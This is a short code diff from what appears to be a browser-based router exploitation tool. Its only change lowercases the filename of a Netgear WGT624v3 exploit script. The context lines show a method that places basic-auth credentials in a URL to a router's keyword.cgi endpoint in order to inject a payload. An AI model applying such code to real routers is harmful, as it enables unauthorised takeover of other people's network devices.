@@ -77,7 +77,7 @@ class WGT624v3Payload extends BasePayload {
     }
 
     private tryInjectPayload(credentials:BasicAuthCredential):Promise<any> {
-        let exploitSrc = document.location.href.replace('index.html', '') + 'netgear_WGT624v3.js';
+        let exploitSrc = document.location.href.replace('index.html', '') + 'netgear_wgt624v3.js';
         let keywordUrl = 'http://' + credentials.username + ':' + credentials.password + '@'
             + this.fingerprintResult.ip + '/keyword.cgi';
 
